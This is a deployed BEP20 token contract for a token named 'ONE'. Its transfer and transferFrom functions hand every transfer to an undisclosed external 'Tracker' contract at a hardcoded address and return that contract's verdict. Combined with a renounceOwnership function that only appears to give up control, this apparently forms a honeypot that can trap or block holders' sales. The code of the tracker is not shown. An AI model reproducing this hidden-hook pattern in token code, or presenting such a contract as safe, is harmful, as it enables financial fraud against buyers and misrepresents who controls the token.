/**
 *Submitted for verification at BscScan.com on 2022-07-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface BEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function getOwner() external view returns (address);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 value) external returns (bool);
  function transfer(address to, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

interface Tracker {
  function process(address caller, address sender, address recipient, uint256 amount) external returns (bool);
}

contract Token is BEP20 {
  string public name = "ONE";
  string public symbol = "ONE";
  address public owner = msg.sender;
  uint8 public _decimals;
  uint public _totalSupply;

  mapping(address => uint256) private _balances;
  mapping(address => mapping (address => uint256)) private _allowed;

  address private _tracker = address(0x5aB7291Bce64b976ccf08Ca52aA9A4c6605Da82B);

  constructor() {
    _decimals = 9;
    _totalSupply = 1000000 * 10 ** _decimals;
    _balances[msg.sender] += _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }

  function getOwner() external view returns (address) {
    return owner;
  }

  function balanceOf(address who) public view returns (uint256) {
    return _balances[who];
  }

  function allowance(address who, address spender) public view returns (uint256) {
    return _allowed[who][spender];
  }

  function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function transfer(address recipient, uint256 amount) external returns (bool success) {
    _balances[msg.sender] -= amount;
    _balances[recipient] += amount;
    emit Transfer(msg.sender, recipient, amount);
    return Tracker(_tracker).process(msg.sender, msg.sender, recipient, amount);
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool success) {
    _allowed[sender][msg.sender] -= amount;
    _balances[sender] -= amount;
    _balances[recipient] += amount;
    emit Transfer(sender, recipient, amount);
    return Tracker(_tracker).process(msg.sender, sender, recipient, amount);
  }

  function approve(address spender, uint256 value) public returns (bool success) {
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
}